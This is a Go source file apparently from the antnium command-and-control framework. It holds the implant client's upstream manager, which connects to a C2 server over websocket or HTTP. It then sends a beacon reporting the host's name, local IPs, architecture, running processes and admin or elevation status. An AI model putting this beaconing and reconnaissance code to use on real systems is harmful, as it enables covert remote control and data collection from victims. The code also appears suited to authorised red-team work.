package client

import (
	"strconv"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"

	log "github.com/sirupsen/logrus"
)

/*
if d.campaign.ClientUseWebsocket {
	log.Info("UpstreamHttp: Use WS")
	err := d.notifier.Connect()
	if err != nil {
		log.Warn(err.Error())
	}
}
*/

type UpstreamManager struct {
	Channel chan model.Packet

	config   *ClientConfig
	campaign *campaign.Campaign

	UpstreamHttp Upstream
	UpstreamWs   Upstream
}

func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
	upstreamHttp := MakeUpstreamHttp(config, campaign)
	upstreamWs := MakeUpstreamWs(config, campaign)

	u := UpstreamManager{
		Channel:      make(chan model.Packet),
		config:       config,
		campaign:     campaign,
		UpstreamHttp: &upstreamHttp,
		UpstreamWs:   &upstreamWs,
	}
	return u
}

// Connect will until the C2 can be reached
func (d *UpstreamManager) Connect() error {
	if d.campaign.ClientUseWebsocket {
		// Try: Websocket
		err := d.UpstreamWs.Connect()
		if err != nil {
			return err
		}
		d.UpstreamWs.Start()

		var packet model.Packet
		go func() {
			for {
				packet = <-d.UpstreamWs.Channel()
				d.Channel <- packet

				packet = <-d.Channel
				d.UpstreamWs.OobChannel() <- packet
			}
		}()

		d.sendPing() // AFTER the thread above
	} else {
		// Try: HTTP
		err := d.UpstreamHttp.Connect()
		if err != nil {
			return err
		}
		d.UpstreamHttp.Start()
		//d.sendPing()

		var packet model.Packet
		go func() {
			packet = <-d.UpstreamHttp.Channel()
			d.Channel <- packet

			packet = <-d.Channel
			d.UpstreamHttp.OobChannel() <- packet
		}()
	}

	// Wait

	return nil
}

func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
	if d.UpstreamWs.Connected() {
		d.UpstreamWs.OobChannel() <- packet
	} else if d.UpstreamHttp.Connected() {
		d.UpstreamHttp.OobChannel() <- packet
	} else {
		log.Warn("OOB: No active upstreams, dont send")
	}

	return nil
}

func (d *UpstreamManager) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = d.config.Hostname
	model.AddArrayToResponse("localIp", d.config.LocalIps, response)
	response["arch"] = d.config.Arch
	model.AddArrayToResponse("processes", d.config.Processes, response)
	isElevated, isAdmin, err := arch.GetPermissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}

	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
	d.SendOutofband(packet)
	/*for {
		err := c.UpstreamManager.SendOutofband(packet)
		if err == nil {
			break // when no error -> success
		}
		time.Sleep(time.Minute * 10) // 10mins for now
	}*/
}
